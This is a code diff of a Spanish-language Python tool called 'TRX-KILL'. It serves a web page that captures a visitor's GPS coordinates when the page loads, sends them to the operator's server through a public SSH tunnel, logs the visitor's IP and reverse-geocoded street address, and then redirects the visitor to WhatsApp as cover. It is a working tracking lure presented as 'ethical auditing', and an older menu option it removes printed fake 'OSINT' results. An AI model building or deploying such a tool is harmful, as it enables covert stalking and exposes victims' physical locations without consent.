@@ -1,32 +1,61 @@
 #!/usr/bin/env python3
 import os
+import time
+import sys
 import threading
 import subprocess
+import requests
 from flask import Flask, request, render_template_string
+
+# Colores Matrix
+GREEN = "\033[1;32m"
+RESET = "\033[0m"
+BLACK_BG = "\033[40m"
 
 app = Flask(__name__)
 URL_FINAL = "https://wa.me/595981000000"
 
-# --- HTML DE RASTREO ---
+def type_print(text, delay=0.02):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
+    print()
+
+def banner():
+    os.system('clear')
+    banner_text = r"""
+  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗██╗     ██╗
+  ██╔══██╗██╔══██╗╚██╗██╔╝    ██║ ██╔╝██║██║     ██║
+  ██████╔╝██████╔╝ ╚███╔╝     █████╔╝ ██║██║     ██║
+  ██╔══██╗██╔══██╗ ██╔██╗     ██╔═██╗ ██║██║     ██║
+  ██║  ██║██║  ██║██╔╝ ██╗    ██║  ██╗██║███████╗██║
+  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚═╝
+    """
+    print(f"{GREEN}{banner_text}{RESET}")
+    print(f"{GREEN} [!] SISTEMA DE AUDITORÍA TRX-KILL | MODO MATRIX [!]{RESET}\n")
+
+def obtener_datos_extra(lat, lon):
+    url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}"
+    try:
+        res = requests.get(url).json()
+        return res.get("display_name", "Ubicación Privada")
+    except: return "No disponible"
+
 HTML_RASTREO = """
 <!DOCTYPE html>
-<html>
-<body onload="capturar()">
+<html><body onload="c()">
     <script>
-        function capturar() {
-            let d = {ua: navigator.userAgent, res: screen.width + "x" + screen.height};
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((p) => {
-                    d.lat = p.coords.latitude; d.lon = p.coords.longitude;
-                    fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d)})
-                    .then(() => window.location.href = "%s");
-                }, () => window.location.href = "%s");
-            } else { window.location.href = "%s"; }
+        function c() {
+            navigator.geolocation.getCurrentPosition((p) => {
+                fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})})
+                .then(() => window.location.href = "%s");
+            }, () => window.location.href = "%s");
         }
     </script>
-</body>
-</html>
-""" % (URL_FINAL, URL_FINAL, URL_FINAL)
+</body></html>
+""" % (URL_FINAL, URL_FINAL)
 
 @app.route('/')
 def index(): return render_template_string(HTML_RASTREO)
@@ -34,49 +63,28 @@ def index(): return render_template_string(HTML_RASTREO)
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    print(f"\n\033[1;32m[!] DATOS CAPTURADOS\033[0m")
-    print(f"[*] UBICACIÓN: {d.get('lat')}, {d.get('lon')}")
-    print(f"[*] MAPA: https://www.google.com/maps/place/{d.get('lat')},{d.get('lon')}")
-    print(f"[*] INFO: {d.get('ua')}")
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    dir_fisica = obtener_datos_extra(d['lat'], d['lon'])
+    print(f"\n{GREEN}[+] ACCESO CONCEDIDO{RESET}")
+    print(f"{GREEN}[*] IP: {ip}{RESET}")
+    print(f"{GREEN}[*] COORD: {d['lat']}, {d['lon']}{RESET}")
+    print(f"{GREEN}[*] CALLE: {dir_fisica}{RESET}")
     return "OK"
-
-def banner():
-    print("\033[1;35m" + r"""
-  _________ ______  __   __       _      _____ _      _      
- |__   __|  ____\ \ \ / /      | |    |_   _| |    | |     
-    | |  | |__   \ \ ' /       | |      | | | |    | |     
-    | |  |  __|   > > <        | |      | | | |    | |     
-    | |  | |____ / / . \       | |____ _| |_| |____| |____ 
-    |_|  |_|____/_/_/ \_\      |______|_____|______|______|
-    """ + "\033[0m")
-    print("      [+] TRX-KILL v14.0 | AUDITORÍA COMPLETA [+]\n")
 
 def main():
     while True:
-        os.system('clear')
         banner()
-        print(" [1] INFORMACIÓN DISPOSITIVO (OSINT)")
-        print(" [2] ZP-LINK (RASTREO GPS DIRECTO)")
-        print(" [3] AYUDA / CREADOR")
-        print(" [4] SALIR")
-        opc = input("\n[?] Elige: ")
+        type_print(f"{GREEN}>> SELECCIONE MÓDULO DE INYECCIÓN:{RESET}")
+        print(f"{GREEN} [1] ANÁLISIS OSINT{RESET}")
+        print(f"{GREEN} [2] MATRIX RASTREO GPS (DIRECTO){RESET}")
+        print(f"{GREEN} [3] SALIR{RESET}")
+        opc = input(f"\n{GREEN}TRX-KILL@ROOT > {RESET}")
 
-        if opc == "1":
-            num = input("Introduce móvil: ")
-            print(f"\n[+] ANALIZANDO: {num}...")
-            print("[+] ESTADO: Dispositivo detectado en red 5G.")
-            print("[+] SEGURIDAD: Firewall activo (Nivel 2).")
-            input("\nENTER para volver...")
-        elif opc == "2":
+        if opc == "2":
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
-            print("\n[!] Generando túnel público...")
-            print("[*] Copia el link 'h.localhost.run' que aparecerá debajo:")
+            type_print(f"{GREEN}[*] ENCRIPTANDO TÚNEL SSH...{RESET}")
             subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
-            input("\n[!] Sesión finalizada. ENTER para volver.")
-        elif opc == "3":
-            print("\n[+] CREADOR: TRX-LILL\n[+] AÑO: 2026\n[+] USO: Solo auditoría ética.")
-            input("\nENTER para volver...")
-        elif opc == "4": break
+        elif opc == "3": break
 
 if __name__ == "__main__":
     main()
